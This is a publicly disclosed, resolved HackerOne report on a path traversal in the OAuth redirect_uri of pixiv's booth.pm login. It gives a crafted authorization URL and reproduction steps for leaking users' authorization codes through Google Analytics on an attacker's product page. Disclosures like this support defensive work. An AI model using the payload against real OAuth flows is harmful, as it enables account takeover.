---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1861974'
original_report_id: '1861974'
title: Stealing Users OAuth authorization code via redirect_uri
weakness: Improper Authorization
team_handle: pixiv
created_at: '2023-02-04T07:53:55.652Z'
disclosed_at: '2023-03-22T08:59:58.038Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 193
asset_identifier: booth.pm
asset_type: URL
max_severity: critical
tags:
- hackerone
- improper-authorization
---

# Stealing Users OAuth authorization code via redirect_uri

## Metadata

- HackerOne Report ID: 1861974
- Weakness: Improper Authorization
- Program: pixiv
- Disclosed At: 2023-03-22T08:59:58.038Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
Path traversal in OAuth `redirect_uri` which can lead to users authorization code being leaked to any malicious user.

The following authorization code flow request is generated at booth login.
```
https://oauth.secure.pixiv.net/v2/auth/authorize?client_id=a1Z7w6JssUQkw5Hid0uIDeuesue9&redirect_uri=https%3A%2F%2Fbooth.pm%2Fusers%2Fauth%2Fpixiv%2Fcallback&response_type=code&scope=read-works+read-favorite-users+read-friends+read-profile+read-email+write-profile&state=%3A1a38b53563599621ce25094661b1c4458ddb52d79d771149
```

Path traversal vulnerability in this `redirect_uri` parameter allows the attacker to direct the user to the product page created by the attacker.
```
redirect_uri=https%3A%2F%2Fbooth.pm%2Fusers%2Fauth%2Fpixiv%2Fcallback/../../../../ja/items/4503924
```
-> redirected to https://booth.pm/ja/items/4503924

If the attacker had Google Analytics enabled, the query string could be exposed when the victim is redirected to the product page, so the unused authorization code is leaked.

## Steps To Reproduce:

  1. The attacker makes his shop public. Register his products and set up his Google Analytics tracking ID.
  2. Have the victim click on the following link; the value of the state parameter can be anything.
```
https://oauth.secure.pixiv.net/v2/auth/authorize?client_id=a1Z7w6JssUQkw5Hid0uIDeuesue9&redirect_uri=https%3A%2F%2Fbooth.pm%2Fusers%2Fauth%2Fpixiv%2Fcallback/../../../../ja/items/[attacker's product id]&response_type=code&scope=read-works+read-favorite-users+read-friends+read-profile+read-email+write-profile&state=%3A1a38b53563599621ce25094661b1c4458ddb52d79d771149
```

  3. When the victim clicks on the above link and proceeds with the login process, he is redirected to the attacker's product page.

  4. The attacker can steal victims' authorizaiton code from Google Analytics real-time reports.

## Impact

Due to path traversal in `redirect_uri` parameter in OAuth flow, its possible to redirect authenticated users to attacker's product page with their OAuth credentials from which its possible to takeover their account.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
